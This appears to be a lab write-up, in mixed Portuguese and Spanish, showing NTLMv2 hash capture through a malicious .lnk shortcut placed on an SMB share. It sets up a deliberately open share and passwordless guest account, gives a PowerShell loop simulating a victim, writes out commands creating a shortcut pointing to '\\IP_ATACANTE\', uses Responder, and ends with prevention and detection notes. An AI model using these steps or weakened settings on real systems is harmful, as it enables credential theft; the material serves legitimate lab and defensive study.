### Recurso compartilhado para exploracao de subidas de arquivos .lnk o .scf

## Descricao

Imagine que você tem uma pasta no seu computador e, dentro dela, um atalho (arquivo .lnk) que aponta para um programa. Quando você abre essa pasta, o Windows é muito "prestativo": ele já tenta carregar o ícone do programa para mostrar bonitinho na tela.
O atacante coloca esse arquivo .lnk em algum lugar onde a vítima vai acessar:

Um compartilhamento de arquivos (SMB) da empresa, um anexo de e-mail, um pendrive "perdido" estrategicamente
Quando a vítima simplesmente abre a pasta onde o arquivo .lnk está (sem nem clicar nele!), o Windows pensa:

"Ops, preciso mostrar o ícone desse atalho. Deixa eu ver onde ele está... Ah, está num servidor de rede. Vou lá buscar rapidinho!" 

O Windows então automaticamente tenta se conectar ao servidor do atacante para baixar o ícone.


## Configuracao

- criar uma pasta Shares no C:\ e fazer click direito
  <img width="1270" height="826" alt="smb1" src="https://github.com/user-attachments/assets/0e48ebd1-8cd9-490c-8b7b-0e4ff22f2581" />

- click no Share
  <img width="1083" height="745" alt="smb2" src="https://github.com/user-attachments/assets/e2c4c307-9e63-4692-be2e-61446ea612b9" />

- no Security → edit → Add → Everyone permisos full o read/write e aplicar todo
  <img width="1306" height="792" alt="smb3" src="https://github.com/user-attachments/assets/d0f35df1-a2c2-4b55-979c-12a7a391f421" />


- como guest sem senha
  PS C:\Windows\system32> net user guest /active:yes
The command completed successfully.

PS C:\Windows\system32> net user guest /passwordreq:no
The command completed successfully.

PS C:\Windows\system32> net user guest ""
User name                    Guest
Full Name

- Adicionar a Guest no Acces this computer from the network e tirarlo do Deny access…
<img width="1262" height="771" alt="smb4" src="https://github.com/user-attachments/assets/69d8f73c-7d9d-426e-b953-15c0ba9928f4" />


### Adding Schedule Task to Trigger LNK File on SMB Shares

- Salvar esse script no C:\Users\h.harper\lnk-trigger.ps1
while ($true) {
    $folder = "C:\Shares"
    $latest = Get-ChildItem -Path $folder -Filter "*.lnk" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

    if ($latest) {
        Start-Process $latest.FullName
    }

    Start-Sleep -Seconds 60
    Remove-Item -Path "C:\Shares\*" -Recurse -Force
}

## Attack

- Criacao do .lnk
```
PS C:\Users\pparker\Downloads> $objShell = New-Object -ComObject WScript.shell
PS C:\Users\pparker\Downloads> $lnk = $objShell.CreateShortcut("C:\Shares\test.lnk")
PS C:\Users\pparker\Downloads> $lnk.TargetPath = "\\IP_ATACANTE\"
PS C:\Users\pparker\Downloads> $lnk.WindowStyle = 1
PS C:\Users\pparker\Downloads> $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
PS C:\Users\pparker\Downloads> $lnk.Description = "Test" 
PS C:\Users\pparker\Downloads> $lnk.HotKey = "Ctrl+Alt+T"
PS C:\Users\pparker\Downloads> $lnk.Save()  
```
- Iniciar Responder
  <img width="619" height="675" alt="r3" src="https://github.com/user-attachments/assets/f2e110f7-0504-40c5-98e9-43d93e08f412" />


- Click no arquivo/pasta
<img width="1158" height="662" alt="rel1" src="https://github.com/user-attachments/assets/498e868a-c14a-4e57-a980-0eabb0071aae" />

- Recebenmos NTLMv2
  <img width="921" height="447" alt="r4" src="https://github.com/user-attachments/assets/cf000a85-898b-42bd-af33-fb0226c8d9d6" />


## Prevencao
- Rede: Bloquear SMB na saída | Desabilitar Protocolos Legados LLMNR, NetBIOS-NS e mDNS em toda a rede via Política de Grupo
- Sistema: Desabilitar Autenticação NTLM


## Wazuh log (nao precisamos rule pois ja e detectado por Suricata)
<img width="1881" height="471" alt="wazuh-alert-com-suricata" src="https://github.com/user-attachments/assets/f8a083a2-d522-4486-94d0-fe3b1ea2be5a" />








  





